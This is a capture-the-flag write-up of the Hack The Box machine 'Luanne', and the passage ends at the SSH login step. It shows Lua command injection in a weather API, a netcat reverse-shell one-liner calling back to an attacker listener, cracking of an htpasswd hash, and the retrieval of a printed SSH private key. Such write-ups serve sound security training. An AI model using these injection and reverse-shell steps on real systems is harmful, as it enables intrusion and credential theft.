# HTB - Luanne

## Overview

![](../../.gitbook/assets/0-luanne-infocard.png)

This easy difficulty BSD system...Short description to include any strange things to be dealt with

## Useful Skills and Tools

### Decrypt `.enc` file in BSD \(also look up how to in normal linux openssl enc\)

* description with generic example

### Run commands as another user \(`sudo`\) in BSD

```bash
doas whoami
#root
```

### location of password hashes in BSD

`/etc/master.passwd`

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.218`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.

```bash
┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ nmap -sCV -n -p- -Pn -v -oA luanne 10.10.10.218
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 19:09 EDT
Nmap scan report for 10.10.10.218
Host is up (0.064s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1066.53 seconds
```

Nmap only showed three ports were open on this machine: 22- SSH, 80 - HTTP, and 9001 - which said `Medusa httpd 1.12 (Supervisor process manager)`.

### Port 80 - HTTP

I started out my enumeration by navigating to `10.10.10.218` in my browser.

![](../../.gitbook/assets/1-unauth.png)

I was immediately greeted by a Basic HTTP authorization prompt.  Since I didn't have any credentials I tried a few basic defaults, but no luck.

![](../../.gitbook/assets/2-index.png)

Navigating to `/index.html` brought me to a default `nginx` installation page.

![](../../.gitbook/assets/2-robots.png)

There was only one disallow line in `robots.txt` that showed a directory called `/weather`. 

![](../../.gitbook/assets/3-weather.png)

This did not reveal anything interesting, however.  I left `dirbuster` running while I checked out the next service.  I searched for exploits related to this version of `nginx` but only found a few denial of service vulnerabilities and a CNAME leakage.  There was nothing useful.

### Port 9001 - HTTP

![](../../.gitbook/assets/4-9001.png)

Navigating to the page hosted on port 9001 also gave me a Basic HTTP authentication prompt.  However, this one gave me a little clue.  I did some research on the Supervisor process manager, looking for default credentials after seeing the hint of  "default".

* [https://readthedocs.org/projects/supervisor/downloads/pdf/latest/](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/)

![](../../.gitbook/assets/5-default.png)

default seemed to be user:123 from the manual \(though it specifies none:none\)

![](../../.gitbook/assets/6-supervisor-status.png)

after logging in I had a supervisor-status page that showed what appeared to be running processes on the server

![](../../.gitbook/assets/7.5-processes.png)

```bash
USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
nginx         79  1.6  0.1  33940  3288 ?     S    10:22AM 1:16.12 nginx: worker process 
root           0  0.0  0.2      0 13184 ?     DKl  10:21AM 0:12.73 [system]
root           1  0.0  0.0  19852  1528 ?     Is   10:21AM 0:00.01 init 
root         164  0.0  0.0  32528  2296 ?     Ss   10:21AM 0:00.17 /usr/sbin/syslogd -s 
root         308  0.0  0.0  19708  1336 ?     Is   10:21AM 0:00.00 /usr/sbin/powerd 
_httpd       336  0.0  0.3 118876 17040 ?     Ss   10:22AM 7:37.56 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
root         347  0.0  0.0  73104  2916 ?     Is   10:22AM 0:00.04 /usr/sbin/sshd 
root         366  0.0  0.0  33368  1824 ?     Is   10:22AM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
r.michaels   378  0.0  0.0  34996  1996 ?     Is   10:22AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
_httpd       394  0.6  0.0  35160  2004 ?     Ss   10:22AM 0:07.32 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
root         396  0.0  0.0  20216  1652 ?     Is   10:22AM 0:00.14 /usr/sbin/cron 
_httpd      9224  0.0  0.0  35460  2332 ?     I     1:49PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
_httpd      9657  0.0  0.0  35460  2332 ?     I     1:33PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
_httpd     12348  0.0  0.0  17744  1456 ?     O    12:02AM 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ 
_httpd     16606  0.0  0.0  35160     4 ?     R    12:02AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
_httpd     18685  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
_httpd     20969  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
_httpd     26236  0.0  0.0  35460  2296 ?     I     8:54PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
root         413  0.0  0.0  19780  1584 ttyE1 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE1 
root         389  0.0  0.0  23792  1584 ttyE2 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE2 
root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3
```

I saw a cron in the process output, as well as a weather.lua

![](../../.gitbook/assets/8-no-exec.png)

I tried checking for local file inclusion and code execution vulnerabilities but they just gave errors.

### Port 80 - `/weather/forecast/`

![](../../.gitbook/assets/9.5-weather-forecast.png)

I found a directory `/weather/forecast/` using Dirbuster.

![](../../.gitbook/assets/9-weather-forecast.png)

"No city specified. Use 'city=list' to list available cities."

![](../../.gitbook/assets/10-weather-test.png)

'test' showed unknown city error

![](../../.gitbook/assets/11-lua-error.png)

Sending a query of `'` \(single quote\) resulted in a "nil value" Lua error.  I expected to test for a SQL injection vulnerability, but got something else instead.  I did some reading on Lua syntax to see if I could figure out how to get this to execute code.

* [https://www.lua.org/manual/5.1/manual.html](https://www.lua.org/manual/5.1/manual.html)

![](../../.gitbook/assets/12-noscript-xss-warning.png)

My first attempt triggered a warning from NoScript about a possible XSS attack.  I had to close off the function parameters with `')`, separate the commands with a `;`, and use a Lua comment `--` at the end closed off the insertion to get this warning.  I still did not get code execution however.

![](../../.gitbook/assets/12-lua-code-exec.png)

 Looking a bit closer at my attempt, I noticed that I had typed `os.system('id')` rather than `os.execute('id')` which NoScript saw as JavaScript, triggering that warning.  Fixing this error allowed me to get command execution. 

{% hint style="info" %}
NoScript still caught the attempt using **`os.execute`**, but at least it drew my attention to my error the first time!
{% endhint %}

```bash
root:*:0:0:Charlie &:/root:/bin/sh
toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
daemon:*:1:1:The devil himself:/:/sbin/nologin
operator:*:2:5:System &:/usr/guest/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
games:*:7:13:& pseudo-user:/usr/games:/sbin/nologin
postfix:*:12:12:& pseudo-user:/var/spool/postfix:/sbin/nologin
named:*:14:14:& pseudo-user:/var/chroot/named:/sbin/nologin
ntpd:*:15:15:& pseudo-user:/var/chroot/ntpd:/sbin/nologin
sshd:*:16:16:& pseudo-user:/var/chroot/sshd:/sbin/nologin
_pflogd:*:18:18:& pseudo-user:/var/chroot/pflogd:/sbin/nologin
_rwhod:*:19:19:& pseudo-user:/var/rwho:/sbin/nologin
_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin
_timedc:*:22:22:& pseudo-user:/nonexistent:/sbin/nologin
_sdpd:*:23:23:& pseudo-user:/nonexistent:/sbin/nologin
_httpd:*:24:24:& pseudo-user:/var/www:/sbin/nologin
_mdnsd:*:25:25:& pseudo-user:/nonexistent:/sbin/nologin
_tests:*:26:26:& pseudo-user:/nonexistent:/sbin/nologin
_tcpdump:*:27:27:& pseudo-user:/var/chroot/tcpdump:/sbin/nologin
_tss:*:28:28:& pseudo-user:/var/tpm:/sbin/nologin
_rtadvd:*:30:30:& pseudo-user:/var/chroot/rtadvd:/sbin/nologin
_unbound:*:32:32:& pseudo-user:/var/chroot/unbound:/sbin/nologin
_nsd:*:33:33:& pseudo-user:/var/chroot/nsd:/sbin/nologin
uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
```

Using this command execution I pulled `/etc/passwd` to enumerate the users on the machine.  There were only two users who could login with a shell, `root` and `r.michaels`.  

```text
NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
```

The command `uname -a` revealed this to be a NetBSD system.  I wasn't sure what kind of reverse shell would work on a BSD system, so I checked the one-stop-shop for all things Payload.

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md\#netcat-openbsd](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)

> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`

![](../../.gitbook/assets/13-reverse-shell.png)

I found a reverse shell with nc \(without -e\) for openbsd, and hoped that it would work for this distro as well.  The response hung for awhile after sending, which was a good sign.

## Initial Foothold

```bash
┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ script luanne-init  
Script started, output log file is 'luanne-init'.
┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ bash
zweilos@kali:~/htb/luanne$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.187] from (UNKNOWN) [10.10.10.218] 54839
sh: can't access tty; job control turned off
$ id && hostname
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
luanne.htb
```

It worked!

### Enumeration as `_httpd`

```text
$ which python3
which: PATH environment variable is not set
```

Checked to see if python3 was installed, but got an error that the PATH was not set. After some testing I found that my usual TTY upgrades were not working.

```text
$ pwd
/var/www
$ ls -la
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .
drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..
-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
-rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
$ cat .htpasswd 
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

found an MD5 hash in `.htpasswd`

```text
┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ hashcat -O -D1,2 -a0 -m500 hash /usr/share/wordlists/rockyou.txt --username
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest    

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
Time.Started.....: Sat Mar 27 20:11:46 2021 (0 secs)
Time.Estimated...: Sat Mar 27 20:11:46 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    30002 H/s (7.20ms) @ Accel:256 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3074/14344385 (0.02%)
Rejected.........: 2/3074 (0.07%)
Restore.Point....: 2048/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: slimshady -> ANTHONY

Started: Sat Mar 27 20:11:43 2021
Stopped: Sat Mar 27 20:11:48 2021
```

It cracked within seconds to reveal the password `iamthebest`.

![](../../.gitbook/assets/14-webapi.png)

I was able to use this to log into the other web portal on port 80.

![](../../.gitbook/assets/15-webapi.png)

There did not seem to be anything further I could do here other than discover the `/weather/forecast/` endpoint I had already used to gain access to the machine.

## Road to User

```text
$ find / -user r.michaels 2>/dev/null
/proc/378
/proc/378/fd
/proc/378/task
/proc/378/emul
/proc/378/auxv
/proc/378/cmdline
/proc/378/environ
/proc/378/fpregs
/proc/378/limit
/proc/378/map
/proc/378/maps
/proc/378/mem
/proc/378/note
/proc/378/notepg
/proc/378/regs
/proc/378/stat
/proc/378/statm
/proc/378/status
/var/mail/r.michaels
/home/r.michaels
```

Since I only had one user to go off, I tried using that password to switch users to `r.michaels` but failed.  I also tried finding everything that `r.michaels` had access to, but there wasn't much.

```text
$ ls -la /home/r.michaels
ls: r.michaels: Permission denied
$ ls -la /var/mail/r.michaels
-rw-------  1 r.michaels  wheel  9172 Sep 16  2020 /var/mail/r.michaels
```

I tried to see what was in those directories, but couldn't see anything I could access.

```text
$ ps -auxw
USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
nginx         79  2.5  0.1  33696  3308 ?     S    10:22AM 2:20.96 nginx: worker process 
root           0  0.0  0.2      0 13288 ?     OKl  10:21AM 0:22.40 [system]
root           1  0.0  0.0  19852  1528 ?     Is   10:21AM 0:00.01 init 
root         164  0.0  0.0  32528  2296 ?     Ss   10:21AM 0:00.18 /usr/sbin/syslogd -s 
root         267  0.0  0.1 117960  7340 ?     Il   10:21AM 0:38.76 /usr/pkg/bin/vmtoolsd 
root         308  0.0  0.0  19708  1336 ?     Is   10:21AM 0:00.00 /usr/sbin/powerd 
_httpd       336  0.0  0.3 119028 17052 ?     Ss   10:22AM 7:38.21 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
root         347  0.0  0.0  73104  2916 ?     Is   10:22AM 0:00.04 /usr/sbin/sshd 
root         366  0.0  0.0  33368  1824 ?     Is   10:22AM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
r.michaels   378  0.0  0.0  34996  1996 ?     Is   10:22AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /hom
_httpd       394  0.0  0.0  35160  2004 ?     Ss   10:22AM 0:40.21 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
root         396  0.0  0.0  20216  1652 ?     Is   10:22AM 0:00.15 /usr/sbin/cron 
_httpd       408  0.0  0.0  19988  1652 ?     S    10:22AM 0:00.22 /bin/sh /usr/local/scripts/memory.sh 
_httpd       414  0.0  0.0  21748  1656 ?     I    10:22AM 0:00.63 /bin/sh /usr/local/scripts/processes.sh 
_httpd       422  0.0  0.0  19992  1656 ?     S    10:22AM 0:00.22 /bin/sh /usr/local/scripts/uptime.sh 

...snipped extra users attepts at reverse shells and privesc...

_httpd     18685  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
_httpd     20969  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr
_httpd     21048  0.0  0.0  19884  1520 ?     O    12:41AM 0:00.00 ps -auxw 
_httpd     22683  0.0  0.0  35460  2332 ?     I    12:17AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr

...snipped more extra metagaming stuff...

root         419  0.0  0.0  19780  1584 ttyE0 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc constty 
root         413  0.0  0.0  19780  1584 ttyE1 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE1 
root         389  0.0  0.0  23792  1584 ttyE2 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE2 
root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3
```

There was a process run by the `r.michaels` user that seemed to be running another instance of the `weather.lua`, this time on port 3001.

{% hint style="info" %}
Note: From other user's attempts from the process output I saw one that showed**`python3.7 -c import pty;pty.spawn("/bin/sh")`**. You may be able to use this to upgrade your shell. I didn't notice this until after I was done, and it would have been metagaming anyways!
{% endhint %}

```text
$ curl http://localhost:3001
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   199  100   199    0     0  66333      0 --:--:-- --:--:-- --:--:-- 66333
<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
/: <pre>No authorization</pre>
<hr><address><a href="//localhost:3001/">localhost:3001</a></address>
</body></html>
```

I tried using curl to get the local page at 3001 and got a "No Authorization" error.

```text
$ curl -u webapi_user:iamthebest http://localhost:3001
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   386  100   386    0     0   125k      0 --:--:-- --:--:-- --:--:--  125k
<!doctype html>
<html>
  <head>
    <title>Index</title>
  </head>
  <body>
    <p><h3>Weather Forecast API</h3></p>
    <p><h4>List available cities:</h4></p>
    <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
    <p><h4>Five day forecast (London)</h4></p>
    <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
    <hr>
  </body>
</html>
```

since this page was the same as the one on port 80 I tried logging in as `webapi_user`.  This time I was able to retrieve the site.  It looked exactly the same as the one on port 80.

```text
$ curl -u webapi_user:iamthebest http://localhost:3001/r.michaels
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   206  100   206    0     0  68666      0 --:--:-- --:--:-- --:--:-- 68666
<html><head><title>404 Not Found</title></head>
<body><h1>404 Not Found</h1>
/~: <pre>This item has not been found</pre>
<hr><address><a href="//localhost:3001/">localhost:3001</a></address>
</body></html>
$ curl -u webapi_user:iamthebest http://localhost:3001/~/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   207  100   207    0     0  51750      0 --:--:-- --:--:-- --:--:-- 51750
<html><head><title>404 Not Found</title></head>
<body><h1>404 Not Found</h1>
/~/: <pre>This item has not been found</pre>
<hr><address><a href="//localhost:3001/">localhost:3001</a></address>
</body></html>
```

I tried to see if I could access the home directory since this process was being run as 

searched for how to access home directory in a URL and found

* [https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl](https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl)
* [https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths](https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths)

> Used in URLs, interpretation of the tilde as a shorthand for a user's home directory \(e.g., [http://www.foo.org/~bob](http://www.foo.org/~bob)\) is a convention borrowed from Unix. Implementation is entirely server-specific, so you'd need to check the documentation for your web server to see if it has any special meaning.

* [https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/](https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/)

it seems like the tilde thing is also used specifically in nginx

```text
$ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   172    0   172    0     0  57333      0 --:--:-- --:--:-- --:--:-- 57333
<html><head><title>Document Moved</title></head>
<body><h1>Document Moved</h1>
This document had moved <a href="http://localhost:3001/~r.michaels/">here</a>
</body></html>
```

The post was related to python, but it seemed to work, at least somewhat

```text
$ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   601    0   601    0     0   117k      0 --:--:-- --:--:-- --:--:--  117k
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>
```

Putting the trailing slash on the url caused it to give me a directory listing

id\_rsa sounded quite interesting

```text
$ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa
sh: 48: Syntax error: redirection unexpected
$ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   245  100   245    0     0  81666      0 --:--:-- --:--:-- --:--:-- 81666
<html><head><title>500 Internal Error</title></head>
<body><h1>500 Internal Error</h1>
~r.michaels/id_rsa/index.html: <pre>An error occured on the server</pre>
<hr><address><a href="//localhost:3001/">localhost:3001</a></address>
</body></html>
```

However, trying to retrieve the `id_rsa` file gave some errors.

```text
$ curl -u webapi_user:iamthebest ftp://localhost:3001/~r.michaels/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:30 --:--:--     0
curl: (56) response reading failed
```

Next I tried switching protocols to use ftp:// rather than http:// but that failed as well

### Further enumeration

### Finding user creds

```text
$ curl -u webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2610  100  2610    0     0   637k      0 --:--:-- --:--:-- --:--:--  637k
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

I was finally able to get it by removing the specification for curl to interpret what it was pulling through the HTTP protocol

### User.txt

```text
zweilos@kali:~/htb/luanne$ chmod 600 r.michaels.key 
zweilos@kali:~/htb/luanne$ ssh -i r.michaels.key r.michaels@10.10.10.218
